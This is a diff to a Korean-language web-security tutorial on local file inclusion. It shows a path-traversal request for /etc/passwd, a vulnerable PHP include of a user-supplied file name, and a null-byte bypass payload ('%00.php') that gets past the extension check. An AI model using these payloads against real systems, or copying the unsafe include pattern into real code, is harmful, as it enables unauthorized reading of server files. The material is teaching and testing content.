@@ -75,4 +75,20 @@ or
 '''
 GET /testlfi?path=file=../../../../etc/passwd
 ```
+위와같이 테스트해볼 수 있다. 
 </div>
+
+# Bypass - File Inclusion
+
+## Null Byte injection
+
+```php
+<?php include($_GET['file'].".php"); ?>
+```
+
+위와같이 .php 확장자의 파일만 불러올 수 있게 되어있다면, null 바이트 문자를 통해 이를 우회할 수 있다.
+> null을 가르키는 특수 바이트 이후의 모든 문자는 무시된다.
+
+```
+file=../../../../etc/passwd%00.php
+```
